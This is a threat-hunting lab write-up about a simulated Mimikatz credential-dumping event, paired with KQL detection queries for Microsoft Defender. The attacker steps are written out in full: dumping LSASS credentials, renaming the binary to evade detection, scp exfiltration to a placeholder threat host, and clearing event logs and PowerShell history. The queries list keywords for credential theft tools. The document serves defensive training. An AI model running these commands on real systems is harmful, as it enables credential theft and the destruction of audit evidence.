# Threat Event (Credential Dumping with Mimikatz)
**Unauthorized Execution of Mimikatz**

## Steps the "Bad Actor" took to Create Logs and IoCs:
1. Download Mimikatz:
  - Obtained mimikatz_master.zip from a known repository or a malicious link (e.g., https://github.com/ParrotSec/mimikatz)
  - Extracted it to a temporary folder: C:\Users\<User>\AppData\Temp\Local\mimikatz-master\
2. Execute Mimikatz:
  - Renamed the binary "mimikatz.exe" to "mimi64.exe" to evade basic file-name detections.
  - Ran Mimikatz with typical arguments to dump credentials from LSASS:
    ```mimi64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\Users\<User>\AppData\Local\Temp\creddump.txt```
3. Exfiltration of the dumped credentials:
  - Attacker attempts to upload creddump.txt to a remote host.
    ```scp C:\Users\<User>\AppData\Local\Temp\creddump.txt <threat-actor>@<threat-host>:/home/<threat-actor>```
4. Cleanup:
  - Clears PowerShell or Windows Event Logs to hide evidence of unauthorized usage.
    ```Remove-Item "C:\Users\<User>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"```
    ```wevtutil cl Application```
    ```wevtutil cl Security```
    ```wevtutil cl System```

---

## Tables Used to Detect IoCs:
| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used for detecting the download of the Mimikatz ZIP or EXE file, as well as any credential dump files created.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect the Mimikatz process creation (mimi64.exe), command-line arguments, and any subsequent processes launched.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| If Mimikatz or a related script attempts to exfiltrate the credential dump file, these logs can detect unusual outbound traffic.|

---

## Related Queries:
```kql
// 1. Detect known Mimikatz file downloads or suspicious file name patterns
DeviceFileEvents
| where FileName has_any ("mimikatz", "mimi", "katz", "mk")
| project Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessAccountName

// 2. Identify Mimikatz execution via typical file names or rename attempts
DeviceProcessEvents
| where FileName in ("mimikatz", "mimi", "katz", "mk")
    or ProcessCommandLine has_any ("mimikatz", "mimi", "katz", "sekurlsa::logonpasswords", "privilege::debug")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ActionType

// 3. Detect creation of the credential dump file (e.g. creddump.txt)
DeviceFileEvents
| where FileName has_any("creddump.txt", "creds.txt", "dump.txt", "lsass.txt")
| project Timestamp, DeviceName, FileName, ActionType, FolderPath, InitiatingProcessCommandLine

// 4. Look for unusual outbound connections that might indicate data exfiltration
DeviceNetworkEvents
| where InitiatingProcessFileName in ("mimikatz.exe", "mimi64.exe", "mimi.exe", "powershell.exe")
| where RemoteIP != "InternalIPs"  // Adjust for your environment's internal IP ranges
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, RemoteIP, RemotePort, RemoteUrl
| order by Timestamp desc

// 5. Check for event log clearing after Mimikatz usage
DeviceProcessEvents
| where ProcessCommandLine has_any ("wevtutil", "Clear-EventLog")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, ActionType
```

---

## Created By:
- **Author Name**: Clay Hickman
- **Author Contact**: https://www.linkedin.com/in/clay-h-980ba5262
- **Date**: February 26, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `February 26, 2025`  | `Clay Hickman`   
